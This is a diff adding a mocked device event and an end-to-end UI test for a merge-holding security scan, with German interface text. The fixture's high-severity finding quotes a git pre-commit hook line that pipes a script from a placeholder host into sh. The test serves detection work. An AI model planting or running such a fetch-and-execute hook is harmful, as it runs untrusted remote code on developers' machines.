@@ -461,6 +461,33 @@ try {
         device.send(JSON.stringify({ type: 'hello', version: message.version, projects: [{ name: 'demo', harnesses: ['pi'] }] }));
         sendStatus('stopped');
       }
+      if (message.type === 'session.takeover') {
+        // What the device reports when a git hook holds the merge.
+        sendEvent(message.session, {
+          type: 'takeover',
+          report: {
+            state: 'held',
+            auto: false,
+            commits: 2,
+            files: 3,
+            branch: 'main',
+            checks: ['feste Regeln', 'OSV'],
+            findings: [
+              {
+                severity: 'high',
+                rule: 'git-hook',
+                path: '.husky/pre-commit',
+                line: 1,
+                message: 'Git-Hook: läuft bei jedem Commit auf deinem Rechner',
+                excerpt: 'curl -s https://example.invalid/x.sh | sh',
+              },
+              { severity: 'low', rule: 'long-line', path: 'src/data.json', line: 2, message: 'Sehr lange Zeile' },
+            ],
+            request: 'K7QF2M',
+          },
+        });
+        sendEvent(message.session, { type: 'done', aborted: false });
+      }
       if (message.type === 'vm.stop') {
         sendStatus('stopping');
         setTimeout(() => {
@@ -607,6 +634,25 @@ try {
         throw new Error('device got no vm.stop');
       }
       await shot('34-vm-stopped');
+
+      // Save progress: autosync on, then a takeover the device holds.
+      await page.click(text('Automatisch übernehmen'));
+      await page.waitForSelector('[role=switch][aria-checked=true]', { timeout: 5_000 });
+      await page.click(`button${text('Fortschritt sichern')}`);
+      await waitForText('Nicht übernommen: schwere Funde');
+      await waitForText('harness merge --approve K7QF2M');
+      if (!received.some((message) => message.type === 'session.takeover')) {
+        throw new Error('device got no session.takeover');
+      }
+      await page.keyboard.press('Escape');
+      await page.$eval(text('harness merge --approve K7QF2M'), (element) => element.scrollIntoView({ block: 'center' }));
+      await new Promise((resolve) => setTimeout(resolve, 300));
+      await shot('39-takeover-held');
+      // The card and autosync survive a reload.
+      await page.reload({ waitUntil: 'networkidle0' });
+      await waitForText('Nicht übernommen: schwere Funde');
+      await page.click(`form ${text('pi in demo')}`);
+      await page.waitForSelector('[role=switch][aria-checked=true]', { timeout: 5_000 });
       await page.keyboard.press('Escape');
 
       // The same controls under Settings -> Devices, in light mode.
